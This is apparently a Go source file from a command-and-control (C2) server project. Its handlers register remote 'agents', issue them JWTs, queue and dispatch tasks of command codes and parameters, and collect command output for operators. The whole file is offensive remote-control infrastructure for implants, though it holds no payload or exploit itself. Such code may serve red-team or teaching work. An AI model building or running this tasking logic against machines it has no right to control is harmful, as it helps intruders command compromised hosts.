package server

import (
	"bytes"
	"fmt"
	"log/slog"

	bytehandler "github.com/execute-assembly/c2-proj/server/internal/bytes"
	"github.com/execute-assembly/c2-proj/server/internal/database"
	"github.com/execute-assembly/c2-proj/server/internal/rpc"
)

func NewClientRegisterHandler(Ip string, reader *bytes.Reader) ([]byte, error) {
	ClientGuid, CodeName, err := database.RegisterClient(reader, Ip)
	if err != nil {
		return nil, err
	}

	JwtToken, err := CreateJWT(ClientGuid)
	if err != nil {
		return nil, err
	}

	JwtBytes, err := bytehandler.CraftJwtResponse(JwtToken)
	if err != nil {
		return nil, err
	}

	rpc.BroadcastEvent(1, CodeName, fmt.Sprintf("\n[*]New agent connected: %s", CodeName), 0)

	return JwtBytes, nil
}

func GetTaskHandler(AgentGuid string) ([]byte, error) {

	err := database.UpdateLastSeen_db(AgentGuid)
	if err != nil {
		return nil, err
	}

	rpc.CommandMu.RLock()
	Tasks := rpc.CommandMap[AgentGuid]
	if len(Tasks) > 3 {
		Tasks = Tasks[:3]
	}
	rpc.CommandMu.RUnlock()

	var taskData []bytehandler.TaskData
	for _, t := range Tasks {
		taskData = append(taskData, bytehandler.TaskData{
			TaskID:      t.TaskID,
			CommandCode: t.CommandCode,
			Param1:      t.Param1,
			Param2:      t.Param2,
		})
	}
	respBytes, err := bytehandler.CraftTaskResponse(taskData)
	if err != nil {
		return nil, err
	}

	for _, t := range Tasks {
		rpc.PendingMu.Lock()
		rpc.PendingTasks[t.TaskID] = rpc.PendingTasksMap{
			Guid:        AgentGuid,
			CommandCode: t.CommandCode,
			Param1:      t.Param1,
			Param2:      t.Param2,
		}
		rpc.PendingMu.Unlock()
	}

	rpc.CommandMu.Lock()
	rpc.CommandMap[AgentGuid] = rpc.CommandMap[AgentGuid][len(Tasks):]
	rpc.CommandMu.Unlock()

	return respBytes, nil
}

func HandlePostOutput(AgentGuid string, Data *bytes.Reader) error {

	OutputList, err := bytehandler.ParseCommandOutput(Data)
	if err != nil {
		return err
	}

	rpc.PendingMu.Lock()
	defer rpc.PendingMu.Unlock()
	for _, t := range OutputList {
		slog.Info("Agent Sent Command Output", "Agent_Guid", AgentGuid, "TaskID", t.TaskID)
		rpc.BroadcastEvent(2, AgentGuid, t.Output, t.TaskID)
		delete(rpc.PendingTasks, t.TaskID)
	}

	return nil

}
